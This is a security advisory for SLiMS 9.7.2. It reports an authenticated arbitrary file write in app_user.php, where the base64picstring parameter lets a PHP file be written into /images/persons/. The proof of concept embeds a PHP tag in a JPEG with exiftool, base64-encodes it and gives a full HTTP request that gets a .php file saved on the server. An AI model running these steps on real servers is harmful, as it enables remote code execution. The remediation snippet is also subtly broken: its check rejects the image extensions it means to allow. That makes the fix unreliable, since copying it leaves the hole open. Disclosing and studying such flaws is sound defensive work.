## Summary 
This is a report related to the Arbitrary File Write security issue with authenticated users found in Slims v9.7.2 (Latest Version). Arbitrary File Write is a vulnerability that occurs when there is no sanitization or filtering when uploading files to the server, potentially allowing attackers to upload malicious PHP scripts and result in Remote Code Execution.

A vulnerability was found in the app_user.php file, specifically in the POST parameter base64picstring. 

## Tested Version
- Slims 9 Bulian (v9.7.2) - Latest

## Analysis

Inside app_user.php there is a feature used to upload files with the following code: 

```
if (!empty($_FILES['image']) AND $_FILES['image']['size']) {
	//some code
} else if (!empty($_POST['base64picstring'])) {
	//some code
}
```
There is an if else statement in which the user can upload files or base64 strings. The vulnerability occurs in the POST parameter base64picstring.

```
} else if (!empty($_POST['base64picstring'])) {
   list($filedata, $filedom) = explode('#image/type#', $_POST['base64picstring']);
   $filedata = base64_decode($filedata);
   $fileinfo = getimagesizefromstring($filedata);
   $valid = strlen($filedata)/1024 < $sysconf['max_image_upload'];
   $valid = (!$fileinfo || $valid === false) ? false : in_array($fileinfo['mime'],    $sysconf['allowed_images_mimetype']);
   $new_filename = 'user_'.str_replace(array(',', '.', ' ', '-'), '_', strtolower($data['username'])).'.'.strtolower($filedom);
```
The code above performs explode() on the string #image/type#, which separates the file contents and extension, and then the file content is decoded in the $filedata variable. Although there is mime type validation using the getimagesize() function, in this case it can still be bypassed by adding a valid image header.

Next, the **Sinks** is in the file_put_contents() function, which is where the actual vulnerability occurs.
```
 if ($valid AND file_put_contents(IMGBS.'persons/'.$new_filename, $filedata)) {
	$data['user_image'] = $dbs->escape_string($new_filename);
	if (!defined('UPLOAD_SUCCESS')) define('UPLOAD_SUCCESS', 1);
	$upload_status = UPLOAD_SUCCESS;
}
```
In this case, the attacker can upload malicious files stored in the /images/persons/ directory.

## Proof of Concept(PoC)

Prerequisite: A valid administrator account is required. 

The attacker inserts a malicious PHP script into a valid image using exiftool.
```
┌──(xpl0dec㉿MSI)-[~]
└─$ exiftool -DocumentName="<?php phpinfo(); ?>" black.jpg
    1 image files updated

┌──(xpl0dec㉿MSI)-[~]
└─$ exiftool black.jpg
ExifTool Version Number         : 13.10
File Name                       : black.jpg
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
Document Name                   : <?php phpinfo(); ?>
```
Then perform base64 encoding on the image that has been injected with the PHP script.
```
┌──(xpl0dec㉿MSI)-[~]
└─$ cat black.jpg | base64 -w 0
/9j/4AAQSkZJRgABAQEAYABgAAD/4QB2RXhpZgAATU0AKgAAAAgABQENAAIAAAAUAAAASgEaAAUAAAABAAAAXgEbAAUAAAABAAAAZgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAA8P3BocCBwaHBpbmZvKCk7ID8+AAAAAGAAAAABAAAAYAAAAAH/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAEKAMgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDwCiiimAUUUUhhRRRQIKKKKAEpaKKACiiigAooooAKKKKBhRRRQIKKKKACiiigAooooGFFFFABRRRTAKKKKACiiigAooopAFFFFMAooooAKKKKACiiigAooooAKKKKACiiikAUUUUwFopKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKQBS0lFMAopaKAEooooAKKKKACiiigAooooAKKKKACiiigQUUUUAFFFFAwooooAKKKKACiiikAUUUUwCiiigAooooAKKKKACiiigAooopAFFFFMAooopCCiiigAooooGFFFFMAooooAKKKKQBRRRTAKKKKACiiigAooooAKKKKACiiikIKKKKYBRRRSAKKKKBhRRRTEFFFFABRRRQMKKKKACiiigAopaKAEooooAKKKKACiiigAooooEFFFFABRRRQAUUUUAFFFFIAooopjCiiigAooooEFFFFAwooooAKKKKACiiigAooooAKKKKACiiigAooooEFFFFABRRRQMKKKKQgooopjCiiigAooooAKKKKACiiigAooooAKKKKACiiigQUUUUAFFFFAwooooEFFFFABRRRQAUUUUDCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKQBRRRTEFFFFAwooooEFFFFAwooooAKKKKACiiigAoopaAEooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKWkoAWiiigApKWigApKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAWikooAWiiigAooooAKKKKACiiigBKWiigBKKWigBKWikoAKKWkoAKKWkoAKKKKACiiloAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigApKWigBKKWigBKKWigBKWiigAooooAKKKKACiiigAooooAKKKKACilpKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKWigANFKaSgYUUUUCEooooAKKKWgBKKWkoAKKKKACilNJ3oAKKKWgBKKWkoAKKKWgBKWiigAoooFAwopaKBH//Z
```
And add #image/type#php at the end of the base64 string to represent the extension as .php. 

Request 
```
POST /admin/modules/system/app_user.php?action=detail&ajaxload=1&_=1763111774373 HTTP/1.1
Host: localhost:8112
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Length: 2537
Origin: http://localhost:8112
Connection: keep-alive
Referer: http://localhost:8112/admin/index.php?mod=system
Cookie: SenayanAdmin=d626bab860c7ce262296b3b165c91c2b; debug-bar-tab=ci-vars; debug-bar-state=minimized; admin_logged_in=1; SenayanMember=8a6acb55eb11015734d42e180d8d179c
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="csrf_token"

355f3d703df0d0ce371c06d395fe601e0b08efa5ca6c6abbe15eb01e3d02cb6e
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="form_name"

mainForm
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="userName"

attacker
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="realName"

attacker
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="userType"

1
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="eMail"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[fb]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[tw]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[li]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[rd]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[pn]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[gp]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[yt]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[bl]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="social[ym]"


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="base64picstring"

/9j/4AAQSkZJRgABAQEAYABgAAD/4QB2RXhpZgAATU0AKgAAAAgABQENAAIAAAAUAAAASgEaAAUAAAABAAAAXgEbAAUAAAABAAAAZgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAA8P3BocCBwaHBpbmZvKCk7ID8+AAAAAGAAAAABAAAAYAAAAAH/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAEKAMgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDwCiiimAUUUUhhRRRQIKKKKAEpaKKACiiigAooooAKKKKBhRRRQIKKKKACiiigAooooGFFFFABRRRTAKKKKACiiigAooopAFFFFMAooooAKKKKACiiigAooooAKKKKACiiikAUUUUwFopKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKQBS0lFMAopaKAEooooAKKKKACiiigAooooAKKKKACiiigQUUUUAFFFFAwooooAKKKKACiiikAUUUUwCiiigAooooAKKKKACiiigAooopAFFFFMAooopCCiiigAooooGFFFFMAooooAKKKKQBRRRTAKKKKACiiigAooooAKKKKACiiikIKKKKYBRRRSAKKKKBhRRRTEFFFFABRRRQMKKKKACiiigAopaKAEooooAKKKKACiiigAooooEFFFFABRRRQAUUUUAFFFFIAooopjCiiigAooooEFFFFAwooooAKKKKACiiigAooooAKKKKACiiigAooooEFFFFABRRRQMKKKKQgooopjCiiigAooooAKKKKACiiigAooooAKKKKACiiigQUUUUAFFFFAwooooEFFFFABRRRQAUUUUDCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKQBRRRTEFFFFAwooooEFFFFAwooooAKKKKACiiigAoopaAEooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKWkoAWiiigApKWigApKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAWikooAWiiigAooooAKKKKACiiigBKWiigBKKWigBKWikoAKKWkoAKKWkoAKKKKACiiloAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigApKWigBKKWigBKKWigBKWiigAooooAKKKKACiiigAooooAKKKKACilpKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKWigANFKaSgYUUUUCEooooAKKKWgBKKWkoAKKKKACilNJ3oAKKKWgBKKWkoAKKKWgBKWiigAoooFAwopaKBH//Z#image/type#php
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="passwd1"

Pass1234!
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="passwd2"

Pass1234!
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="saveData"

Save
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1
Content-Disposition: form-data; name="noChangeGroup"

1
------geckoformboundary3b20c4daa7daff64647190bf2ced2b1--

```
The upload results can be accessed directly at the path /images/persons/user_attacker.php.

<img width="1677" height="592" alt="image" src="https://github.com/user-attachments/assets/941b9a8b-f11f-4079-88ae-eb1d88cfdbd1" />


## Impact
This is extremely dangerous because it can lead to Remote Code Execution on the server through the Arbitrary File Write vulnerability and cause very serious damage.

## Remediation 
Restrict file extensions instead of mime types, or whitelist only valid image extensions that can be uploaded. Furthermore, to improve security, generate random file names to make it difficult for attackers to access files directly via URL.

```
list($filedata, $filedom) = explode('#image/type#', $_POST['base64picstring']);

if(in_array($filedom, ['jpg', 'jpeg', 'gif', 'png'])) {
	//exit or error message
	 toastr(__('Image FAILED to upload'))->error();
}
```

## Credits
Reported by xpl0dec (a.k.a Yusuf Ibrahim)

